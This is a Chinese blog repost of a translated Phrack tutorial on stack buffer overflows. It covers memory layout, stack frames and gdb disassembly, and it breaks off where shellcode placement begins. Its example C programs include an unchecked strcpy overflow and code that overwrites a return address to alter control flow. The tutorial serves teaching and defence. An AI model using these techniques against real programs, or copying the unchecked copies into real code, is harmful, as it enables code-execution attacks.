---
categories:
- 技术文章
date: '2008-08-20'
title: 经典转载 - 缓冲区溢出的原理和实践(Phrack)
url: /2008/08/20/1272183/

---


<div style="font-size: 16px;">简&nbsp; &nbsp;介

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp; 在过去的几个月中,被发现和利用的缓冲区溢出漏洞呈现上升趋势.例如syslog,

splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at等等.本文试图

解释什么是缓冲区溢出, 以及如何利用.

&nbsp; &nbsp; 汇编的基础知识是必需的. 对虚拟内存的概念, 以及使用gdb的经验是十分有益

的, 但不是必需的. 我们还假定使用Intel x86 CPU, 操作系统是Linux.

&nbsp; &nbsp; 在开始之前我们给出几个基本的定义: 缓冲区,简单说来是一块连续的计算机内

存区域, 可以保存相同数据类型的多个实例. C程序员通常和字缓冲区数组打交道.

最常见的是字符数组. 数组, 与C语言中所有的变量一样, 可以被声明为静态或动态

的. 静态变量在程序加载时定位于数据段. 动态变量在程序运行时定位于堆栈之中.

溢出, 说白了就是灌满, 使内容物超过顶端, 边缘, 或边界. 我们这里只关心动态

缓冲区的溢出问题, 即基于堆栈的缓冲区溢出.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;进程的内存组织形式

&nbsp; &nbsp; 为了理解什么是堆栈缓冲区, 我们必须首先理解一个进程是以什么组织形式在

内存中存在的. 进程被分成三个区域: 文本, 数据和堆栈. 我们把精力集中在堆栈

区域, 但首先按照顺序简单介绍一下其他区域.

&nbsp; &nbsp; 文本区域是由程序确定的, 包括代码(指令)和只读数据. 该区域相当于可执行

文件的文本段. 这个区域通常被标记为只读, 任何对其写入的操作都会导致段错误

(segmentation violation).

&nbsp; &nbsp; 数据区域包含了已初始化和未初始化的数据. 静态变量储存在这个区域中. 数

据区域对应可执行文件中的data-bss段. 它的大小可以用系统调用brk(2)来改变.

如果bss数据的扩展或用户堆栈把可用内存消耗光了, 进程就会被阻塞住, 等待有了

一块更大的内存空间之后再运行. 新内存加入到数据和堆栈段的中间.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;/------------------"&nbsp;&nbsp;内存低地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp; 文本&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|------------------|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;(已初始化) |

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;数据&nbsp; &nbsp; |

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;(未初始化) |

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|------------------|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp; 堆栈&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;"------------------/&nbsp;&nbsp;内存高地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Fig. 1 进程内存区域

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 什么是堆栈?

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;~~~~~~~~~~~~~

&nbsp; &nbsp; 堆栈是一个在计算机科学中经常使用的抽象数据类型. 堆栈中的物体具有一个特性:

最后一个放入堆栈中的物体总是被最先拿出来, 这个特性通常称为后进先处(LIFO)队列.

&nbsp; &nbsp; 堆栈中定义了一些操作. 两个最重要的是PUSH和POP. PUSH操作在堆栈的顶部加入一

个元素. POP操作相反, 在堆栈顶部移去一个元素, 并将堆栈的大小减一.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;为什么使用堆栈?

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~~~~~~~

&nbsp; &nbsp; 现代计算机被设计成能够理解人们头脑中的高级语言. 在使用高级语言构造程序时

最重要的技术是过程(procedure)和函数(function). 从这一点来看, 一个过程调用可

以象跳转(jump)命令那样改变程序的控制流程, 但是与跳转不同的是, 当工作完成时,

函数把控制权返回给调用之后的语句或指令. 这种高级抽象实现起来要靠堆栈的帮助.

&nbsp; &nbsp; 堆栈也用于给函数中使用的局部变量动态分配空间, 同样给函数传递参数和函数返

回值也要用到堆栈.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;堆栈区域

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~

&nbsp; &nbsp; 堆栈是一块保存数据的连续内存. 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部.

堆栈的底部在一个固定的地址. 堆栈的大小在运行时由内核动态地调整. CPU实现指令

PUSH和POP, 向堆栈中添加元素和从中移去元素.

&nbsp; &nbsp; 堆栈由逻辑堆栈帧组成. 当调用函数时逻辑堆栈帧被压入栈中, 当函数返回时逻辑

堆栈帧被从栈中弹出. 堆栈帧包括函数的参数, 函数地局部变量, 以及恢复前一个堆栈

帧所需要的数据, 其中包括在函数调用时指令指针(IP)的值.&nbsp; &nbsp;

&nbsp; &nbsp; 堆栈既可以向下增长(向内存低地址)也可以向上增长, 这依赖于具体的实现. 在我

们的例子中, 堆栈是向下增长的. 这是很多计算机的实现方式, 包括Intel, Motorola,

SPARC和MIPS处理器. 堆栈指针(SP)也是依赖于具体实现的. 它可以指向堆栈的最后地址,

或者指向堆栈之后的下一个空闲可用地址. 在我们的讨论当中, SP指向堆栈的最后地址.

&nbsp; &nbsp; 除了堆栈指针(SP指向堆栈顶部的的低地址)之外, 为了使用方便还有指向帧内固定

地址的指针叫做帧指针(FP). 有些文章把它叫做局部基指针(LB-local base pointer).

从理论上来说, 局部变量可以用SP加偏移量来引用. 然而, 当有字被压栈和出栈后, 这

些偏移量就变了. 尽管在某些情况下编译器能够跟踪栈中的字操作, 由此可以修正偏移

量, 但是在某些情况下不能. 而且在所有情况下, 要引入可观的管理开销. 而且在有些

机器上, 比如Intel处理器, 由SP加偏移量访问一个变量需要多条指令才能实现.

&nbsp; &nbsp; 因此, 许多编译器使用第二个寄存器, FP, 对于局部变量和函数参数都可以引用, 

因为它们到FP的距离不会受到PUSH和POP操作的影响. 在Intel CPU中, BP(EBP)用于这

个目的. 在Motorola CPU中, 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP.

考虑到我们堆栈的增长方向, 从FP的位置开始计算, 函数参数的偏移量是正值, 而局部

变量的偏移量是负值.

&nbsp; &nbsp; 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以

恢复). 然后它把SP复制到FP, 创建新的FP, 把SP向前移动为局部变量保留空间. 这称为

例程的序幕(prolog)工作. 当例程退出时, 堆栈必须被清除干净, 这称为例程的收尾

(epilog)工作. Intel的ENTER和LEAVE指令, Motorola的LINK和UNLINK指令, 都可以用于

有效地序幕和收尾工作.

&nbsp; &nbsp; 下面我们用一个简单的例子来展示堆栈的模样:

&nbsp; &nbsp; 

example1.c:

------------------------------------------------------------------------------

void function(int a, int b, int c) {

&nbsp; &nbsp;char buffer1[5];

&nbsp; &nbsp;char buffer2[10];

}

void main() {

&nbsp;&nbsp;function(1,2,3);

}

------------------------------------------------------------------------------&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp; 为了理解程序在调用function()时都做了哪些事情, 我们使用gcc的-S选项编译, 以产

生汇编代码输出:

$ gcc -S -o example1.s example1.c

&nbsp; &nbsp; 通过查看汇编语言输出, 我们看到对function()的调用被翻译成:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;pushl $3

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;pushl $2

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;pushl $1

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call function

&nbsp;&nbsp;

&nbsp; &nbsp; 以从后往前的顺序将function的三个参数压入栈中, 然后调用function(). 指令call

会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做

的第一件事情是例程的序幕工作:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;pushl %ebp

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl %esp,%ebp

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;subl $20,%esp

&nbsp; &nbsp; 将帧指针EBP压入栈中. 然后把当前的SP复制到EBP, 使其成为新的帧指针. 我们把这

个被保存的FP叫做SFP. 接下来将SP的值减小, 为局部变量保留空间.

&nbsp; &nbsp; 我们必须牢记:内存只能以字为单位寻址. 在这里一个字是4个字节, 32位. 因此5字节

的缓冲区会占用8个字节(2个字)的内存空间, 而10个字节的缓冲区会占用12个字节(3个字)

的内存空间. 这就是为什么SP要减掉20的原因. 这样我们就可以想象function()被调用时

堆栈的模样(每个空格代表一个字节):

内存低地址&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;内存高地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;buffer2&nbsp; &nbsp;&nbsp; &nbsp; buffer1&nbsp; &nbsp;sfp&nbsp; &nbsp;ret&nbsp; &nbsp;a&nbsp; &nbsp;&nbsp;&nbsp;b&nbsp; &nbsp;&nbsp;&nbsp;c

&lt;------&nbsp; &nbsp;[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;][&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

堆栈顶部&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;堆栈底部

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;缓冲区溢出

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~~~

&nbsp; &nbsp; 缓冲区溢出是向一个缓冲区填充超过它处理能力的数据所造成的结果. 如何利用这个

经常出现的编程错误来执行任意代码呢? 让我们来看看另一个例子:

example2.c

------------------------------------------------------------------------------

void function(char *str) {

&nbsp; &nbsp;char buffer[16];

&nbsp; &nbsp;strcpy(buffer,str);

}

void main() {

&nbsp;&nbsp;char large_string[256];

&nbsp;&nbsp;int i;

&nbsp;&nbsp;for( i = 0; i &lt; 255; i++)

&nbsp; &nbsp; large_string[i] = 'A';

&nbsp;&nbsp;function(large_string);

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 这个程序的函数含有一个典型的内存缓冲区编码错误. 该函数没有进行边界检查就复

制提供的字符串, 错误地使用了strcpy()而没有使用strncpy(). 如果你运行这个程序就

会产生段错误. 让我们看看在调用函数时堆栈的模样:

内存低地址&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;内存高地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;buffer&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;sfp&nbsp; &nbsp;ret&nbsp; &nbsp;*str

&lt;------&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; [&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ]&nbsp; &nbsp;

堆栈顶部&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;堆栈底部

&nbsp; &nbsp; 这里发生了什么事? 为什么我们得到一个段错误? 答案很简单: strcpy()将*str的

内容(larger_string[])复制到buffer[]里, 直到在字符串中碰到一个空字符. 显然, 

buffer[]比*str小很多. buffer[]只有16个字节长, 而我们却试图向里面填入256个字节

的内容. 这意味着在buffer之后, 堆栈中250个字节全被覆盖. 包括SFP, RET, 甚至*str!

我们已经把large_string全都填成了A. A的十六进制值为0x41. 这意味着现在的返回地

址是0x41414141. 这已经在进程的地址空间之外了. 当函数返回时, 程序试图读取返回

地址的下一个指令, 此时我们就得到一个段错误.

&nbsp; &nbsp; 因此缓冲区溢出允许我们更改函数的返回地址. 这样我们就可以改变程序的执行流程.

现在回到第一个例子, 回忆当时堆栈的模样: 

内存低地址&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;内存高地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;buffer2&nbsp; &nbsp;&nbsp; &nbsp; buffer1&nbsp; &nbsp;sfp&nbsp; &nbsp;ret&nbsp; &nbsp;a&nbsp; &nbsp;&nbsp;&nbsp;b&nbsp; &nbsp;&nbsp;&nbsp;c

&lt;------&nbsp; &nbsp;[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;][&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ][&nbsp; &nbsp; ]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

堆栈顶部&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;堆栈底部

&nbsp; &nbsp; 现在试着修改我们第一个例子, 让它可以覆盖返回地址, 而且使它可以执行任意代码.

堆栈中在buffer1[]之前的是SFP, SFP之前是返回地址. ret从buffer1[]的结尾算起是4个

字节.应该记住的是buffer1[]实际上是2个字即8个字节长. 因此返回地址从buffer1[]的开

头算起是12个字节. 我们会使用这种方法修改返回地址, 跳过函数调用后面的赋值语句

'x=1;', 为了做到这一点我们把返回地址加上8个字节. 代码看起来是这样的:

example3.c:

------------------------------------------------------------------------------

void function(int a, int b, int c) {

&nbsp; &nbsp;char buffer1[5];

&nbsp; &nbsp;char buffer2[10];

&nbsp; &nbsp;int *ret;

&nbsp; &nbsp;ret = buffer1 + 12;

&nbsp; &nbsp;(*ret) += 8;

}

void main() {

&nbsp;&nbsp;int x;

&nbsp;&nbsp;x = 0;

&nbsp;&nbsp;function(1,2,3);

&nbsp;&nbsp;x = 1;

&nbsp;&nbsp;printf("%d\n",x);

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 我们把buffer1[]的地址加上12, 所得的新地址是返回地址储存的地方. 我们想跳过

赋值语句而直接执行printf调用. 如何知道应该给返回地址加8个字节呢? 我们先前使用

过一个试验值(比如1), 编译该程序, 祭出工具gdb:

------------------------------------------------------------------------------
  
[aleph1]$ gdb example3

GDB is free software and you are welcome to distribute copies of it

under certain conditions; type "show copying" to see the conditions.

There is absolutely no warranty for GDB; type "show warranty" for details.

GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...

(no debugging symbols found)...

(gdb) disassemble main

Dump of assembler code for function main:

0x8000490 &lt;main&gt;:&nbsp; &nbsp;&nbsp; &nbsp; pushl&nbsp;&nbsp;%ebp

0x8000491 &lt;main+1&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esp,%ebp

0x8000493 &lt;main+3&gt;:&nbsp; &nbsp;&nbsp;&nbsp;subl&nbsp; &nbsp;$0x4,%esp

0x8000496 &lt;main+6&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0,0xfffffffc(%ebp)

0x800049d &lt;main+13&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x3

0x800049f &lt;main+15&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x2

0x80004a1 &lt;main+17&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x1

0x80004a3 &lt;main+19&gt;:&nbsp; &nbsp; call&nbsp; &nbsp;0x8000470 &lt;function&gt;

0x80004a8 &lt;main+24&gt;:&nbsp; &nbsp; addl&nbsp; &nbsp;$0xc,%esp

0x80004ab &lt;main+27&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x1,0xfffffffc(%ebp)

0x80004b2 &lt;main+34&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;0xfffffffc(%ebp),%eax

0x80004b5 &lt;main+37&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%eax

0x80004b6 &lt;main+38&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x80004f8

0x80004bb &lt;main+43&gt;:&nbsp; &nbsp; call&nbsp; &nbsp;0x8000378 &lt;printf&gt;

0x80004c0 &lt;main+48&gt;:&nbsp; &nbsp; addl&nbsp; &nbsp;$0x8,%esp

0x80004c3 &lt;main+51&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;%ebp,%esp

0x80004c5 &lt;main+53&gt;:&nbsp; &nbsp; popl&nbsp; &nbsp;%ebp

0x80004c6 &lt;main+54&gt;:&nbsp; &nbsp; ret

0x80004c7 &lt;main+55&gt;:&nbsp; &nbsp; nop

------------------------------------------------------------------------------

&nbsp; &nbsp; 我们看到当调用function()时, RET会是0x8004a8, 我们希望跳过在0x80004ab的赋值

指令. 下一个想要执行的指令在0x8004b2. 简单的计算告诉我们两个指令的距离为8字节.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; Shell Code

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~

&nbsp; &nbsp; 现在我们可以修改返回地址即可以改变程序执行的流程, 我们想要执行什么程序呢?

在大多数情况下我们只是希望程序派生出一个shell. 从这个shell中, 可以执行任何我

们所希望的命令. 但是如果我们试图破解的程序里并没有这样的代码可怎么办呢? 我们

怎么样才能将任意指令放到程序的地址空间中去呢? 答案就是把想要执行的代码放到我

们想使其溢出的缓冲区里, 并且覆盖函数的返回地址, 使其指向这个缓冲区. 假定堆栈

的起始地址为0xFF, S代表我们想要执行的代码, 堆栈看起来应该是这样:

内存低&nbsp; &nbsp;&nbsp;&nbsp;DDDDDDDDEEEEEEEEEEEE&nbsp;&nbsp;EEEE&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp; &nbsp;&nbsp;&nbsp;内存高

地址&nbsp; &nbsp;&nbsp; &nbsp; 89ABCDEF0123456789AB&nbsp;&nbsp;CDEF&nbsp;&nbsp;0123&nbsp;&nbsp;4567&nbsp;&nbsp;89AB&nbsp;&nbsp;CDEF&nbsp; &nbsp;&nbsp;&nbsp;地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;buffer&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; sfp&nbsp; &nbsp;ret&nbsp; &nbsp;a&nbsp; &nbsp;&nbsp;&nbsp;b&nbsp; &nbsp;&nbsp;&nbsp;c

&lt;------&nbsp; &nbsp;[SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;^&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; |

